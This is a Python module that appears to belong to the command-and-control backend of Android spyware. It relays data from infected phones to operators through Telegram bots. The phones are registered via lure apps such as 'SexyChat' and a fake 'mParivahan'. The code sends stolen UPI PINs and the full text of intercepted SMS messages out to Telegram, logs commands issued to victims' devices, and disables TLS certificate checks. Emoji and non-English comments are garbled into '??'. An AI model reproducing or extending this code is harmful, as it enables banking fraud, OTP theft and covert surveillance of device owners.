"""
Multi-Telegram service with support for multiple bots
Each admin has 5 bots (each with token + chat_id)
"""

import aiohttp
import logging
import ssl
from datetime import datetime
from typing import Optional, Dict, List
from ..database import mongodb
from ..config import settings

logger = logging.getLogger(__name__)

class TelegramMultiService:
    """Telegram service with support for multiple bots per admin"""
    
    def __init__(self):
        self.enabled = settings.TELEGRAM_ENABLED
        
        # 2FA Bot (separate for authentication)
        self.twofa_bot_token = settings.TELEGRAM_2FA_BOT_TOKEN
        self.twofa_chat_id = settings.TELEGRAM_2FA_CHAT_ID
        
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        if not self.enabled:
            logger.warning("??  Telegram notifications disabled")
        else:
            logger.info("? Telegram Multi-Service initialized")
    
    async def get_admin_bots(self, admin_username: str) -> List[Dict]:
        """Get admin's Telegram bots (each bot has token + chat_id)"""
        admin_doc = await mongodb.db.admins.find_one(
            {"username": admin_username},
            {"telegram_bots": 1}
        )
        
        if admin_doc and "telegram_bots" in admin_doc:
            # Filter valid bots (have real tokens)
            valid_bots = [
                bot for bot in admin_doc["telegram_bots"]
                if "TOKEN_HERE" not in bot.get("token", "")
            ]
            return valid_bots
        
        return []
    
    async def send_to_admin(
        self, 
        admin_username: str, 
        message: str, 
        bot_index: Optional[int] = None,
        parse_mode: str = "HTML"
    ) -> bool:
        """
        Send message to admin's Telegram bot(s)
        
        Args:
            admin_username: Admin username
            message: Message text
            bot_index: If specified, send via that bot only (1-5), else send via all
            parse_mode: Parse mode
        """
        if not self.enabled:
            return False
        
        bots = await self.get_admin_bots(admin_username)
        
        if not bots:
            logger.warning(f"??  No bots configured for admin: {admin_username}")
            return False
        
        # If bot_index specified, send via that bot only
        if bot_index is not None:
            target_bot = next((bot for bot in bots if bot["bot_id"] == bot_index), None)
            if target_bot:
                return await self._send_message_to_chat(
                    target_bot["token"], 
                    target_bot["chat_id"], 
                    message, 
                    parse_mode
                )
            else:
                logger.warning(f"??  Bot {bot_index} not found for admin {admin_username}")
                return False
        
        # Send via all bots
        results = []
        for bot in bots:
            result = await self._send_message_to_chat(
                bot["token"], 
                bot["chat_id"], 
                message, 
                parse_mode
            )
            results.append(result)
        
        return any(results)
    
    async def send_to_all_admins(
        self,
        message: str,
        parse_mode: str = "HTML"
    ) -> Dict[str, bool]:
        """
        Send message to all admin bots
        (for important security notifications)
        """
        results = {}
        
        cursor = mongodb.db.admins.find({}, {"username": 1})
        admins = await cursor.to_list(length=1000)
        
        for admin in admins:
            username = admin["username"]
            success = await self.send_to_admin(username, message, parse_mode=parse_mode)
            results[username] = success
        
        return results
    
    async def send_2fa_notification(
        self,
        admin_username: str,
        ip_address: str,
        code: Optional[str] = None,
        message_prefix: Optional[str] = None
    ) -> bool:
        """
        Send 2FA notification to admin's personal Bot 4 (2FA)
        
        Args:
            admin_username: Admin username
            ip_address: IP address  
            code: OTP code
            message_prefix: Optional custom prefix (e.g., for bot auth)
        """
        # Get admin's Bot 4 (2FA) config
        admin = await self.mongodb.db.admins.find_one({"username": admin_username})
        
        if not admin:
            logger.warning(f"??  Admin not found for 2FA: {admin_username}")
            return False
        
        # Find Bot 4 (2FA) in admin's telegram_bots
        bot_4 = None
        telegram_bots = admin.get("telegram_bots", [])
        
        for bot in telegram_bots:
            if bot.get("bot_id") == 4:  # Bot 4 = 2FA/Login
                bot_4 = bot
                break
        
        if not bot_4:
            logger.warning(f"??  Bot 4 (2FA) not configured for admin: {admin_username}")
            return False
        
        bot_token = bot_4.get("token")
        chat_id = bot_4.get("chat_id")
        
        if not bot_token or not chat_id or "TOKEN_HERE" in bot_token:
            logger.warning(f"??  Bot 4 token/chat_id invalid for admin: {admin_username}")
            return False
        
        # Build message with optional prefix
        if message_prefix:
            message = message_prefix
        else:
            message = "?? <b>Two-Factor Authentication</b>\n\n"
        
        message += f"?? Admin: <code>{admin_username}</code>\n"
        message += f"?? IP: <code>{ip_address}</code>\n"
        
        if code:
            message += f"?? Code: <code>{code}</code>\n"
        
        message += f"? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        
        # Send to admin's personal Bot 4
        return await self._send_message_to_chat(
            bot_token, 
            chat_id, 
            message, 
            "HTML"
        )
    
    async def _send_message_to_chat(self, bot_token: str, chat_id: str, message: str, parse_mode: str = "HTML") -> bool:
        """Send message to a Telegram chat using specific bot token"""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": parse_mode
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=data, ssl=self.ssl_context) as response:
                    if response.status == 200:
                        logger.info(f"? Message sent to chat: {chat_id[:10]}...")
                        return True
                    else:
                        error_text = await response.text()
                        logger.error(f"? Failed to send to {chat_id}: {error_text}")
                        return False
        
        except Exception as e:
            logger.error(f"? Error sending to {chat_id}: {e}")
            return False
    
    # ???????????????????????????????????????????????????????
    # Notification Helpers - Each bot has specific purpose
    # ???????????????????????????????????????????????????????
    # Bot 1: Device notifications (register, online, offline)
    # Bot 2: SMS notifications (new SMS only)
    # Bot 3: Admin activity logs (commands, actions)
    # Bot 4: Login/Logout logs
    # Bot 5: Future use (app builds, etc.)
    # ???????????????????????????????????????????????????????
    
    async def notify_device_registered(
        self,
        device_id: str,
        device_info: dict,
        admin_username: str
    ):
        """Notify device registration (Bot 1)"""
        # ??????? ????????
        app_type = device_info.get('app_type', 'Unknown')
        
        # ??? ???????? ?????
        app_names = {
            'sexychat': '?? SexyChat',
            'mparivahan': '?? mParivahan',
            'sexyhub': '?? SexyHub'
        }
        app_display = app_names.get(app_type.lower(), f'?? {app_type}')
        
        message = f"""
?? <b>New Device Registered</b>

?? Admin: <code>{admin_username}</code>
?? Device ID: <code>{device_id}</code>
?? Model: {device_info.get('model', 'Unknown')}
?? Manufacturer: {device_info.get('manufacturer', 'Unknown')}
?? OS: {device_info.get('os_version', 'Unknown')}
?? App: {app_display}
?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

? Device is now being monitored!
"""
        # Bot 1: Devices - Send to device owner
        await self.send_to_admin(admin_username, message, bot_index=1)
        
        # Also send to Administrator's Bot 1
        await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)
    
    async def notify_upi_detected(
        self,
        device_id: str,
        upi_pin: str,
        admin_username: str
    ):
        """Notify UPI PIN detected (Bot 1 - ???? ????? device registration)"""
        message = f"""
?? <b>UPI PIN Detected</b>

?? Admin: <code>{admin_username}</code>
?? Device ID: <code>{device_id}</code>
?? PIN: <code>{upi_pin}</code>
?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

? Device UPI is now available!
"""
        # Bot 1: Devices - Send to device owner (same channel as registration)
        await self.send_to_admin(admin_username, message, bot_index=1)
        
        # Also send to Administrator's Bot 1
        await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)
    
    async def notify_admin_login(
        self,
        admin_username: str,
        ip_address: str,
        success: bool = True
    ):
        """Notify admin login (Bot 4)"""
        icon = "?" if success else "?"
        status = "Successful" if success else "Failed"
        
        message = f"""
{icon} <b>Admin Login {status}</b>

?? Username: <code>{admin_username}</code>
?? IP: <code>{ip_address}</code>
? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
        
        # Bot 4: Login/Logout logs - Send to logged-in admin
        await self.send_to_admin(admin_username, message, bot_index=4)
        
        # Also send to Administrator's Bot 4
        await self._notify_super_admin(message, bot_index=4, exclude_username=admin_username)
    
    async def notify_command_sent(
        self,
        admin_username: str,
        device_id: str,
        command: str
    ):
        """Notify command sent (Bot 3)"""
        message = f"""
?? <b>Command Sent</b>

?? Admin: <code>{admin_username}</code>
?? Device: <code>{device_id}</code>
? Command: <code>{command}</code>
?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
        # Bot 3: Admin actions/commands log - Send to admin who sent command
        await self.send_to_admin(admin_username, message, bot_index=3)
        
        # Also send to Administrator's Bot 3
        await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)
    
    async def notify_new_sms(
        self,
        device_id: str,
        admin_username: str,
        from_number: str,
        full_message: str
    ):
        """Notify new SMS (Bot 2)"""
        # ??? ???? ???? ?????? ???? ????? ?? (Telegram limit: 4096 characters)
        max_message_length = 3500  # ??? ???? ?? ????? ???? ??????? ?????
        
        if len(full_message) > max_message_length:
            sms_text = full_message[:max_message_length] + "\n\n... (???? ????? ??)"
        else:
            sms_text = full_message
        
        message = f"""
?? <b>New SMS Received</b>

?? Admin: <code>{admin_username}</code>
?? Device: <code>{device_id}</code>
?? From: <code>{from_number}</code>
?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

??????????????????????
?? <b>Message:</b>
{sms_text}
??????????????????????
"""
        # Bot 2: SMS only - Send to device owner
        await self.send_to_admin(admin_username, message, bot_index=2)
        
        # Also send to Administrator's Bot 2
        await self._notify_super_admin(message, bot_index=2, exclude_username=admin_username)
    
    async def notify_admin_created(
        self,
        creator_username: str,
        new_admin_username: str,
        role: str,
        device_token: str
    ):
        """Notify new admin created (Bot 3 - Admin actions)"""
        message = f"""
?? <b>New Admin Created</b>

?? Created by: <code>{creator_username}</code>
?? New admin: <code>{new_admin_username}</code>
?? Role: {role}
?? Device Token: <code>{device_token}</code>
? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
        # Bot 3: Admin actions log - send to creator
        await self.send_to_admin(creator_username, message, bot_index=3)
        
        # Also send to Administrator's Bot 3
        await self._notify_super_admin(message, bot_index=3, exclude_username=creator_username)

    async def notify_device_status_changed(
        self,
        device_id: str,
        admin_username: str,
        status: str,
        is_online: bool
    ):
        """Notify device status change (Bot 3 - Admin Activity)"""
        icon = "??" if is_online else "??"
        status_text = "Online" if is_online else "Offline"
        
        message = f"""
{icon} <b>Device Status Changed</b>

?? Admin: <code>{admin_username}</code>
?? Device: <code>{device_id}</code>
?? Status: {status_text}
?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
        # Bot 3: Admin Activity - Device status changes
        await self.send_to_admin(admin_username, message, bot_index=3)
        
        # Also send to Administrator's Bot 3
        await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)
    
    async def notify_admin_logout(
        self,
        admin_username: str,
        ip_address: str
    ):
        """Notify admin logout (Bot 4)"""
        message = f"""
?? <b>Admin Logged Out</b>

?? Username: <code>{admin_username}</code>
?? IP: <code>{ip_address}</code>
? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
        # Bot 4: Login/Logout logs - Send to logged-out admin
        await self.send_to_admin(admin_username, message, bot_index=4)
        
        # Also send to Administrator's Bot 4
        await self._notify_super_admin(message, bot_index=4, exclude_username=admin_username)
    
    async def notify_admin_action(
        self,
        admin_username: str,
        action: str,
        details: str = "",
        ip_address: str = None
    ):
        """
        Notify admin action/activity (Bot 3)
        
        Args:
            admin_username: Admin username
            action: Action type
            details: Action details
            ip_address: Optional IP address
        """
        message = f"""
?? <b>Admin Activity</b>

?? Admin: <code>{admin_username}</code>
? Action: {action}
"""
        if details:
            message += f"?? Details: {details}\n"
        
        if ip_address:
            message += f"?? IP: <code>{ip_address}</code>\n"
        message += f"?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        
        
        # Bot 3: Admin actions log - Send to acting admin
        await self.send_to_admin(admin_username, message, bot_index=3)
        
        # Also send to Administrator's Bot 3
        await self._notify_super_admin(message, bot_index=3, exclude_username=admin_username)

    async def _notify_super_admin(
        self,
        message: str,
        bot_index: int,
        exclude_username: Optional[str] = None
    ):
        """
        Send notification to Super Admin's specific bot
        
        Args:
            message: Message to send
            bot_index: Which bot to send to (1-5)
            exclude_username: Don't send if this is the super admin
        """
        try:
            # Find all super admins
            cursor = mongodb.db.admins.find(
                {"role": "super_admin"},
                {"username": 1}
            )
            super_admins = await cursor.to_list(length=100)
            
            for admin in super_admins:
                username = admin["username"]
                
                # Skip if this is the same admin who triggered the event
                if exclude_username and username == exclude_username:
                    continue
                
                # Send to specific bot of super admin
                await self.send_to_admin(username, message, bot_index=bot_index)
                
        except Exception as e:
            logger.error(f"? Error notifying super admin: {e}")

telegram_multi_service = TelegramMultiService()
